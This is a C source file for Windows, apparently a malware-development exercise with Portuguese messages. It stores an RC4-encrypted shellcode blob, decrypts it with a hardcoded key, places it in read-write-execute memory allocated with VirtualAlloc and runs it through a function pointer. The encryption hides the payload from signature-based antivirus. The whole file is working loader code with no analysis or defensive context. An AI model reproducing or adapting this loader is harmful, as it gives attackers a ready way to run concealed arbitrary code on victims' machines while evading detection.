#include <stdio.h>
#include <Windows.h>

typedef struct
{
	unsigned int i;
	unsigned int j;
	unsigned char s[256];

} Rc4Context;

VOID PrintPayload(IN PBYTE shellcode, IN SIZE_T shellcode_size);
int rc4Init(Rc4Context* context, const unsigned char* key, size_t length);
VOID rc4Cipher(Rc4Context* context, const unsigned char* input, unsigned char* output, size_t length);

unsigned char payload[] =
"\x41\x05\xda\x87\xc9\x76\x44\xc5\x96\xf1\x35\x62\x16\x88\xa8\xe1"
"\x26\x7e\x93\x38\xc0\xae\x43\xa5\x9c\xa3\xc5\x8b\xf9\x43\x32\x4c"
"\x09\x95\xc0\xf4\x2e\x53\x7e\x5d\xdd\x71\x32\x1a\x1a\x09\xec\x1a"
"\x7c\xad\xbe\xab\x7c\x5c\x69\x4d\x4d\x18\x4c\xf7\x3b\x52\x6f\x70"
"\x19\x9b\x22\xf7\xb7\x5a\x3e\x45\x46\xea\x6a\x10\xc5\x1c\x7a\x06"
"\x8a\x2e\x7a\x3b\x64\x6e\x30\x86\xf0\xb6\x45\xe4\x83\x6c\x70\x71"
"\x0a\x60\x84\x03\xef\x85\x8f\xe4\x23\x16\x4b\xcb\x83\x01\x84\x63"
"\xf1\xe8\xc8\xe1\xe6\xf5\x11\x0a\x0f\xf2\x33\x6d\xe0\x7d\x3b\x7f"
"\xba\x43\xc9\xa6\xd6\x58\x31\x8f\x79\xbe\x78\x0d\x25\xd2\x65\x0d"
"\xd4\x39\x7a\x4d\xf4\xd6\x74\x8c\xb4\xab\x67\x2b\xcb\xe2\x73\x69"
"\x60\x4f\x83\x4c\x5d\xa7\x4a\x90\x3d\xc0\x79\x2d\xb9\xa0\xd5\xc4"
"\xc8\x4c\x1c\xfa\x96\x74\x31\x49\xe0\x52\xf8\x23\xd2\x32\x10\xde"
"\x8e\x13\x24\x4f\xc2\x50\x36\xe3\xad\x60\x36\x8a\xe1\x6d\xa3\x68"
"\xf4\x51\x2b\x0a\x0a\x9e\x83\x94\x85\xdc\xbb\xc6\x05\xb8\x67\x1e"
"\x5a\x09\x58\x29\x45\x6b\xd1\x23\x05\x5a\x71\xbf\x60\xda\xf1\xa1"
"\x01\x7d\x8f\x56\x4c\x0e\xb0\xc9\xa5\xbc\x68\x60\xd6\xf6\x53\x3b"
"\x67\x8a\x6b\x1f\xb0\x3a\x84\x93\x34\xdf\xf9\xd0\x72\x91\x35\xb6"
"\x63\xdc\x68\x66\xe5";

unsigned char decoded[sizeof(payload)];

int main() {
	SIZE_T sc_size = sizeof(payload);
	
	Rc4Context ctx = { 0 };

	unsigned char* key = "teste123";
	rc4Init(&ctx, key, strlen(key));

	rc4Cipher(&ctx, payload, decoded, sc_size);


	void* buffer = VirtualAlloc(
		NULL,
		sc_size,
		(MEM_COMMIT | MEM_RESERVE),
		PAGE_EXECUTE_READWRITE);
	printf("[+] Alocado %zu-bytes com permissao PAGE_EXECUTE_READWRITE\n", sc_size);

	if (buffer == NULL) {
		printf("[+] Falha ao alocar memoria");
	}

	//PrintPayload(decoded, sc_size);

	memcpy(buffer, decoded, sc_size);

	void (*funcao_legal)() = (void (*)())buffer;
	funcao_legal();

	return 0;
}

VOID PrintPayload(IN PBYTE shellcode, IN SIZE_T shellcode_size) {
	printf("Decodificado: \n\"");
	for (size_t i = 0; i < shellcode_size; i++) {
		printf("\\x%02x", shellcode[i]); // Formato \xHH
	}
	printf("\"\n");
}

int rc4Init(Rc4Context* context, const unsigned char* key, size_t length) {
	unsigned int i;
	unsigned int j;
	unsigned char temp;	

	if (context == NULL || key == NULL)
		return ERROR_INVALID_PARAMETER;

	context->i = 0;
	context->j = 0;

	for (i = 0; i < 256; i++)
	{
		context->s[i] = i;
	}

	for (i = 0, j = 0; i < 256; i++)
	{
		j = (j + context->s[i] + key[i % length]) % 256;

		temp = context->s[i];
		context->s[i] = context->s[j];
		context->s[j] = temp;
	}

}


void rc4Cipher(Rc4Context* context, const unsigned char* input, unsigned char* output, size_t length) {
	unsigned char temp;

	unsigned int i = context->i;
	unsigned int j = context->j;
	unsigned char* s = context->s;

	while (length > 0)
	{
		i = (i + 1) % 256;
		j = (j + s[i]) % 256;

		temp = s[i];
		s[i] = s[j];
		s[j] = temp;

		if (input != NULL && output != NULL)
		{
			*output = *input ^ s[(s[i] + s[j]) % 256];

			input++;
			output++;
		}

		length--;
	}

	context->i = i;
	context->j = j;
}

